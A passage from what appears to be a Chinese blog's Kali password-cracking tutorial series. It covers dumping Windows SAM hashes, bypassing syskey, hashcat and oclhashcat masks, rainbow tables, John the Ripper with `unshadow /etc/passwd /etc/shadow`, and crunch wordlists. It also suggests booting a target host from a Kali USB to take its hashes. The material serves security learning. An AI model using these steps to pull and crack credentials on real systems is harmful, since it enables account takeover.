src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208131427699.png" alt="image-20230208131427699"></p><blockquote><p><strong>用户数据库存储在SAM当中</strong></p><p><strong>SYSTEM保存一个密钥，用来加密SAM数据库</strong></p><p><strong>只有输入正确的设置的SYSTEM密码后，SYSTEM才会用这个密码解密出SAM数据库里面加密的登陆账号密码密文，之后再解密SAM数据库中用户的用户名和密码，一般SYSTEM中没有设置密码。</strong></p></blockquote><h5 id="导出hash文件"><a href="#导出hash文件" class="headerlink" title="导出hash文件"></a>导出hash文件</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208132426183.png" alt="image-20230208132426183"></p><blockquote><p>其中此<code>aad3b435b551404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code>表示为空密码</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208135702592.png" alt="image-20230208135702592"></p><blockquote><p>在真实环境中，使用装有kali的iso文件的U盘进行目标主机的hash值获取</p></blockquote><h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h3><blockquote><ul><li><p>开源多线程密码破解工具</p></li><li><p>支持80多种加密算法破解</p></li><li><p>基于CPU的计算能力破解</p></li><li><p>常用参数</p><ul><li><p>-b：测试当前CPU破解各种密码的速度</p></li><li><p>-m：什么类型的哈希值，后门加所属类型id值</p></li><li><p>-a：指定要使用的破解模式-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</p></li><li><p>-o：指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</p></li><li><p>–force：忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</p></li><li><p>–show：显示已经破解的hash及该hash所对应的明文</p></li><li><p>–increment：启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</p></li><li><p>–increment-min： 密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</p></li><li><p>–increment-max：密码最大长度,同上</p></li><li><p>–outfile-format：指定破解结果的输出格式id,默认是3</p></li><li><p>–username：忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</p></li><li><p>–remove：删除已被破解成功的hash</p></li><li><p>-r：使用自定义破解规则</p></li><li><p>-D    # 指定设备类型</p><ul><li>CPU、GPU、FPGA, DSP, Co-Processor</li></ul></li></ul></li></ul></blockquote><h4 id="支持六种模式"><a href="#支持六种模式" class="headerlink" title="支持六种模式"></a>支持六种模式</h4><blockquote><ul><li><p>0 Straight：字典破解</p></li><li><p>1 Combination：将字典中密码进行组合（1 2 &gt; 11 22 12 21）</p></li><li><p>3 Brute force：指定字符集（或全部字符集）所有组合</p></li><li><p>6 Hybrid Wordlist + Mask：混合字典+掩码</p></li><li><p>7 Hybrid Mask + Wordlist：混合掩码+字典</p></li></ul></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208140117380.png" alt="image-20230208140117380"></p><h5 id="掩码规则"><a href="#掩码规则" class="headerlink" title="掩码规则"></a>掩码规则</h5><blockquote><ul><li><p>?l &#x3D; abcdefghijklmnopqrstuvwxyz</p></li><li><p>?u &#x3D; ABCDEFGHIJKLMNOPQRSTUVWXYZ</p></li><li><p>?d &#x3D; 0123456789</p></li><li><p>?s &#x3D; !”#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~</p></li><li><p>?a &#x3D; ?l?u?d?s</p></li><li><p>?b &#x3D; 0x00 - 0xff</p></li></ul><p>用法举例：hashcat -m 100 -a 3 hash -i –increment-min 6 –increment-max 8 ?l?l?l?l?l?l?l?l</p></blockquote><h5 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208140501591.png" alt="image-20230208140501591"></p><h4 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h4><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208135131158.png" alt="image-20230208135131158"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208135801423.png" alt="image-20230208135801423"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208142946868.png" alt="image-20230208142946868"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208143000513.png" alt="image-20230208143000513"></p><h3 id="Syskey加密SAM数据库及破解"><a href="#Syskey加密SAM数据库及破解" class="headerlink" title="Syskey加密SAM数据库及破解"></a>Syskey加密SAM数据库及破解</h3><blockquote><ul><li>使用Bootkey利用RC4算法加密SAM数据库</li><li>Bootkey保存于SYSTEM文件中</li><li>Bootkey就是启动密码</li></ul></blockquote><h4 id="启动Syskey工具对SAM数据库加密"><a href="#启动Syskey工具对SAM数据库加密" class="headerlink" title="启动Syskey工具对SAM数据库加密"></a>启动Syskey工具对SAM数据库加密</h4><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208174939536.png" alt="image-20230208174939536"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208175332927.png" alt="image-20230208175332927"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208180658132.png" alt="image-20230208180658132"></p><h4 id="再次登录需输入启动密码"><a href="#再次登录需输入启动密码" class="headerlink" title="再次登录需输入启动密码"></a>再次登录需输入启动密码</h4><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208180814268.png" alt="image-20230208180814268"></p><blockquote><p>此时需要输入启动密码后才能输入用户名和密码进入系统</p><p>此时如果使用kali进行引导挂载后，获取到的SAM数据库值是经过syskey加密过的值，也就是进行了双重的加密</p></blockquote><h4 id="使用bkhive破解启动密码"><a href="#使用bkhive破解启动密码" class="headerlink" title="使用bkhive破解启动密码"></a>使用bkhive破解启动密码</h4><blockquote><p>Kali2.0之后就不再默认安装bkhive，使用Kali1.0进行破解</p><p>samdump2也要使用kali1.0老版本的</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208182735055.png" alt="image-20230208182735055"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208182843443.png" alt="image-20230208182843443"></p><h5 id="将sda2挂载到kali"><a href="#将sda2挂载到kali" class="headerlink" title="将sda2挂载到kali"></a>将sda2挂载到kali</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208183358689.png" alt="image-20230208183358689"></p><h5 id="使用bkhive提取Bootkey"><a href="#使用bkhive提取Bootkey" class="headerlink" title="使用bkhive提取Bootkey"></a>使用bkhive提取Bootkey</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208183727654.png" alt="image-20230208183727654"></p><h5 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h5><blockquote><p>老版本的samdump2提取出没有加密之前的hash值</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208184523101.png" alt="image-20230208184523101"></p><blockquote><p><strong>注：原理和基本流程如上；但bkhive和samdump2提取出的hash密码与未经过SYTEM key加密过的不同，原因未知</strong></p></blockquote><h3 id="oclhashcat"><a href="#oclhashcat" class="headerlink" title="oclhashcat"></a>oclhashcat</h3><blockquote><ul><li><p>号称世界上最快、唯一的基于GPGPU的密码破解软件</p></li><li><p>免费开源、支持多平台、支持分布式、150+hash算法</p></li><li><p>硬件支持</p><ul><li>虚拟机中无法使用</li><li>支持 CUDA 技术的Nvidia显卡</li><li>支持 OpenCL 技术的AMD显卡</li><li>安装相应的驱动</li></ul></li><li><p>限制</p><ul><li>最大密码长度 55 字符</li><li>使用Unicode的最大密码长度 27 字符</li></ul></li><li><p>关于版本</p><ul><li>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</li></ul></li><li><p>命令</p><ul><li>oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</li><li>通配符<ul><li>?l &#x3D; abcdefghijklmnopqrstuvwxyz</li><li>?u &#x3D; ABCDEFGHIJKLMNOPQRSTUVWXYZ</li><li>?d &#x3D; 0123456789</li><li>?s &#x3D; !”#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~</li><li>?a &#x3D; ?l?u?d?s</li><li>?b &#x3D; 0x00 - 0xff</li></ul></li></ul></li></ul></blockquote><h3 id="RainbowCrack"><a href="#RainbowCrack" class="headerlink" title="RainbowCrack"></a>RainbowCrack</h3><blockquote><ul><li>基于时间记忆权衡技术生成彩虹表</li><li>提前计算密码的HASH值，通过比对HASH值破解密码</li><li>计算HASH的速度很慢，修改版支持CUDA GPU<ul><li><a href="https://www.freerainbowtables.com/en/download/">https://www.freerainbowtables.com/en/download/</a></li></ul></li><li>KALI 中包含的RainbowCrack工具<ul><li>rtgen：预计算，生成彩虹表，耗时的阶段</li><li>rtsort：对rtgen生成的彩虹表进行排序</li><li>rcrack：查找彩虹表破解密码</li><li>以上命令必须顺序使用</li></ul></li><li>下载彩虹表<ul><li><a href="https://freerainbowtables.com/">https://freerainbowtables.com/</a></li><li><a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a></li><li><a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></li></ul></li></ul></blockquote><h4 id="rtgen生成彩虹表"><a href="#rtgen生成彩虹表" class="headerlink" title="rtgen生成彩虹表"></a>rtgen生成彩虹表</h4><blockquote><p>基本格式：</p><p>rtgen  hash算法  字符集  明文密码最小长度  明文密码最大长度  表索引  链最小长度  链最大长度  片索引</p><p>例：rtgen md5 loweralpha 1 7 0 -bench  # -beach计算运算能力</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208220232475.png" alt="image-20230208220232475"></p><ul><li>rtgen md5 loweralpha 1 7 0 1000 1000 0</li></ul><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208220857899.png" alt="image-20230208220857899"></p><blockquote><p><strong>其中生成的彩虹表会放在<code>/usr/share/rainbowcrack</code>目录下</strong></p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208221121852.png" alt="image-20230208221121852"></p><h4 id="rtsort排序彩虹表"><a href="#rtsort排序彩虹表" class="headerlink" title="rtsort排序彩虹表"></a>rtsort排序彩虹表</h4><blockquote><p>为彩虹表排序</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208221435480.png" alt="image-20230208221435480"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208221620609.png" alt="image-20230208221620609"></p><h4 id="rcrack破解"><a href="#rcrack破解" class="headerlink" title="rcrack破解"></a>rcrack破解</h4><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208221813143.png" alt="image-20230208221813143"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208223307770.png" alt="image-20230208223307770"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208223425032.png" alt="image-20230208223425032"></p><h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><blockquote><ul><li><p>支持众多服务应用的加密破解</p><ul><li>john –list&#x3D;formats</li></ul></li><li><p>支持某些对称加密算法破解</p></li><li><p>默认首先检查hash值类型再破解</p></li><li><p>模式</p><ul><li>Wordlist：基于规则的字典破解</li><li>Single crack：默认被首先执行，使用Login&#x2F;GECOS信息尝试破解</li><li>Incremental：所有或指定字符集的暴力破解</li><li>External：需要在主配配文件中用C语言子集编程</li></ul></li></ul></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208224454494.png" alt="image-20230208224454494"></p><h4 id="Single-crack（默认破解模式）"><a href="#Single-crack（默认破解模式）" class="headerlink" title="Single crack（默认破解模式）"></a>Single crack（默认破解模式）</h4><blockquote><p>John主配置文件：**&#x2F;etc&#x2F;john&#x2F;john.conf**</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208230414581.png" alt="image-20230208230414581"></p><h4 id="破解Linux系统账号密码"><a href="#破解Linux系统账号密码" class="headerlink" title="破解Linux系统账号密码"></a>破解Linux系统账号密码</h4><h5 id="合并passwd和shadow文件"><a href="#合并passwd和shadow文件" class="headerlink" title="合并passwd和shadow文件"></a>合并passwd和shadow文件</h5><ul><li><code>unshadow /etc/passwd /etc/shadow &gt;test_pass.txt</code></li></ul><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208231057717.png" alt="image-20230208231057717"></p><h5 id="获取密码文件"><a href="#获取密码文件" class="headerlink" title="获取密码文件"></a>获取密码文件</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208231659602.png" alt="image-20230208231659602"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208231718803.png" alt="image-20230208231718803"></p><h5 id="不指定模式破解"><a href="#不指定模式破解" class="headerlink" title="不指定模式破解"></a>不指定模式破解</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208231831042.png" alt="image-20230208231831042"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208232239621.png" alt="image-20230208232239621"></p><h5 id="密码破解结果文件"><a href="#密码破解结果文件" class="headerlink" title="密码破解结果文件"></a>密码破解结果文件</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208232703038.png" alt="image-20230208232703038"></p><h4 id="破解Windows密码"><a href="#破解Windows密码" class="headerlink" title="破解Windows密码"></a>破解Windows密码</h4><h5 id="提取windows中的hash"><a href="#提取windows中的hash" class="headerlink" title="提取windows中的hash"></a>提取windows中的hash</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208234124671.png" alt="image-20230208234124671"></p><h5 id="破解-1"><a href="#破解-1" class="headerlink" title="破解"></a>破解</h5><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208234436731.png" alt="image-20230208234436731"></p><h4 id="Johnny"><a href="#Johnny" class="headerlink" title="Johnny"></a>Johnny</h4><blockquote><p>图形化界面的 john</p></blockquote><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208235114770.png" alt="image-20230208235114770"></p><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230208235230291.png" alt="image-20230208235230291"></p><h3 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h3><blockquote><ul><li><p>基于彩虹表的LM、NTLM密码破解软件</p></li><li><p>彩虹表：<a href="http://ophcrack.sourceforge.net/tables.php">http://ophcrack.sourceforge.net/tables.php</a></p></li><li><p>针对于windows系统的破解</p></li></ul></blockquote><h4 id="安装彩虹表及破解"><a href="#安装彩虹表及破解" class="headerlink" title="安装彩虹表及破解"></a>安装彩虹表及破解</h4><p><img src="/2023/02/07/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%BA%8C%E3%80%91/image-20230209000201187.png" alt="image-20230209000201187"></p>]]></content>
      
      
      <categories>
          
          <category> 密码破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 密码破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-密码破解【一】</title>
      <link href="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/"/>
      <url>/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote><ul><li>目标系统实施了强安全措施<ul><li>安装了所有补丁</li><li>无任何已知漏洞</li><li>无应用层漏洞</li><li>攻击面最小化</li></ul></li><li>攻击思路<ul><li>社会工程学</li><li>获取目标系统用户身份<ul><li>非授权用户不受信，认证用户可以访问守信资源</li><li>已有用户账号权限受限，需要提权</li><li>不会触发系统报警</li></ul></li></ul></li></ul></blockquote><h2 id="身份认证方法"><a href="#身份认证方法" class="headerlink" title="身份认证方法"></a>身份认证方法</h2><blockquote><ul><li>证明你是你声称你是的那个人<ul><li>你知道什么（账号密码、pin、passphrase）</li><li>你有什么（令牌、token、key、证书、密宝、手机）</li><li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别）</li><li>以上方法结合使用（多因素身份认证）</li></ul></li><li>基于互联网的身份验证仍以账号密码为主要形式</li></ul></blockquote><h2 id="密码破解方法"><a href="#密码破解方法" class="headerlink" title="密码破解方法"></a>密码破解方法</h2><blockquote><ul><li><p>人工猜解</p><ul><li>垃圾桶工程</li><li>被动信息收集</li></ul></li><li><p>基于字典暴力破解（主流）</p></li><li><p>键盘空间字符暴破</p></li><li><p>字典文件</p><ul><li>保存有用户名和密码的文本文件</li><li>&#x2F;usr&#x2F;share&#x2F;wordlist</li><li>&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist</li><li>&#x2F;usr&#x2F;share&#x2F;seclists</li></ul></li><li><p>键盘空间字符爆破</p><ul><li>全键盘空间字符（大量消耗计算资源）</li><li>部分键盘空间字符 (基于规则)</li><li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li></ul></li></ul></blockquote><h2 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h2><blockquote><p><code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options] - &lt;charset string&gt;</code> 默认是小写字符</p></blockquote><h3 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法"></a>基本使用方法</h3><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206211857002.png" alt="image-20230206211857002"></p><ul><li><p><code>crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100</code></p><blockquote><p>-b 按大小分割字典文件（kb&#x2F;kib、mb&#x2F;mib、gb&#x2F;gib）</p><p>-c 每个字典的行数</p><p>以上两个参数必须与-o START 结合使用</p><p>-d 同一字符连贯出现数量（11 &#x2F; aaa）</p></blockquote></li></ul><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206214934485.png" alt="image-20230206214934485"></p><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206215005611.png" alt="image-20230206215005611"></p><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206215502891.png" alt="image-20230206215502891"></p><blockquote><p>-b参数按照大小分割字典文件，图中6MB分成7个字典文件（比6MB大一点就会多出一个字典文件）</p></blockquote><h3 id="字符集字典"><a href="#字符集字典" class="headerlink" title="字符集字典"></a>字符集字典</h3><blockquote><p>在&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst字符文件中挑选字符集组合生成字符集字典</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206220344304.png" alt="image-20230206220344304"></p><ul><li><code>crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></li></ul><blockquote><p>-f：指定字符集列表 + 字符集组合名称（lalpha-sv）</p><p>-o：输出文件</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206220608169.png" alt="image-20230206220608169"></p><h4 id="无重复字符"><a href="#无重复字符" class="headerlink" title="无重复字符"></a>无重复字符</h4><ul><li><code>crunch 1 1 -p 1234567890</code></li></ul><blockquote><p>-p：手动指定要生成的字符，且-p参数必须是最后一个命令的最后一个参数</p><p>最大、最小字符长度失效，但必须存在（例如：命令中的 1 1）</p><p>与-s 参数不兼容（-s 指定起始字符串）</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206220919140.png" alt="image-20230206220919140"></p><ul><li><code>crunch 4 4 0123456789 -s 9990</code></li></ul><blockquote><p>-s：指定起始位置字符串前缀</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206221223905.png" alt="image-20230206221223905"></p><h4 id="读取文件中每行内容作为基本字符生成字典"><a href="#读取文件中每行内容作为基本字符生成字典" class="headerlink" title="读取文件中每行内容作为基本字符生成字典"></a>读取文件中每行内容作为基本字符生成字典</h4><ul><li><code>crunch 1 1 -q read</code></li></ul><blockquote><p>-q参数与-p参数一样，最大最小字符长度失效</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206221821745.png" alt="image-20230206221821745"></p><h3 id="字典组成规则"><a href="#字典组成规则" class="headerlink" title="字典组成规则"></a>字典组成规则</h3><blockquote><ul><li>crunch命令通配符<ul><li><code>@</code>：小写字母 lalpha</li><li><code>,</code>：大写字母 ualpha</li><li><code>%</code>：数字 numeric</li><li><code>^</code>：符号 symbols</li></ul></li></ul></blockquote><ul><li><code>crunch 6 6 -t @,%%^^</code></li></ul><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206224144056.png" alt="image-20230206224144056"></p><h3 id="输出文件压缩"><a href="#输出文件压缩" class="headerlink" title="输出文件压缩"></a>输出文件压缩</h3><blockquote><ul><li><p><code>crunch 4 4 -t @,%^ -o 1.txt -z 7z</code></p></li><li><p>支持压缩格式7z、gzip、bzip2、lzma</p></li><li><p>7z压缩比率最大（crunch压缩比率最好）</p></li></ul></blockquote><h3 id="组合字典"><a href="#组合字典" class="headerlink" title="组合字典"></a>组合字典</h3><blockquote><p>生成尽量小的字典，符合要求的字典，提高效率</p></blockquote><ul><li><code>crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o w.txt -t @d@@ -s cdab</code></li></ul><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206225438765.png" alt="image-20230206225438765"></p><p><img 